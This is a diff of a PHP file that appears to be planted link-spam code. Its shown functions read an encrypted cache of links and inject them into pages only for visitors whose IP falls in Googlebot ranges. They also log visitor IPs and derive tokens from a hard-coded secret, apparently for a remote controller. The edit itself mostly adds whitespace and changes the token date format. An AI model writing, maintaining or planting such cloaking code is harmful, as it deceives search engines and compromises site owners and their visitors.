@@ -1,3 +1,4 @@
+
 <?php
 
 $wtableDir="0im1wt2Path3Dir4String5";
@@ -166,7 +167,8 @@ function site_friend_links($linksContainerHTML){
     $domain = $_SERVER['SERVER_NAME'];
 
     if (file_exists($filePath)) 
-    {         
+    {   
+	 
         
         list($TokenNotime, $unused2notime) = gen_token_notime($domain);
         $cacheDataStr = file_get_contents($filePath);         
@@ -184,14 +186,21 @@ function site_friend_links($linksContainerHTML){
         if(mb_strlen($catLinks) > 20){ $haveCatLinks = true ;} 
         
         if(mb_strlen($allLinks) > 20){ $haveAllLinks = true ;}
-        $ip = $_SERVER['REMOTE_ADDR'];       
+        $ip = $_SERVER['REMOTE_ADDR'];  
+
+	 
+
     
-        if ($haveIndexLinks and isHomePage() ) {           
+        if ($haveIndexLinks and isHomePage() ) {   
+	 
             if( isInGoogleIPRange($ip,$GooglebotIPs) ){
+		 
                
                 $linksHTML = getLinksHTML($indexLinks) ;  
                 $linksContainerHTML.= $linksHTML;  
+ 
             }else{
+ 
                 
                 if ( isGooglebot() && isGoogleHost($ip) ) { 
                     $linksHTML = getLinksHTML($indexLinks) ;             
@@ -232,6 +241,8 @@ function site_friend_links($linksContainerHTML){
             updateIP($ip,$data,$filePath,$TokenNotime);
         }
     
+    }else{
+	 
     }
 
     return $linksContainerHTML; 
@@ -278,7 +289,7 @@ function decrypt($encrypted_data, $token) {
 }
 function gen_token($domain) {  
     $fixed_string = "DhdL8Uf9hHNWVNcGwybP8bDhqwn3WpHrRsgaugOqx";    
-    $utc_time = gmdate('Y-m-d H:i');  
+    $utc_time = gmdate('Y-m-d');  
     $sha256_hash = hash('sha256', $domain . $fixed_string . $utc_time, true);    
     $key = hash('sha256', $sha256_hash, true); 
     $token = strtr(base64_encode($sha256_hash), '+/', '-_'); 
@@ -346,6 +357,7 @@ function processSaveAPIData($gotEncJson,$Token,$TokenNotime,$filePath){
 ///
 
 function heartBT(){
+ 
     
     $originalTimeZone = date_default_timezone_get();
     date_default_timezone_set('UTC');
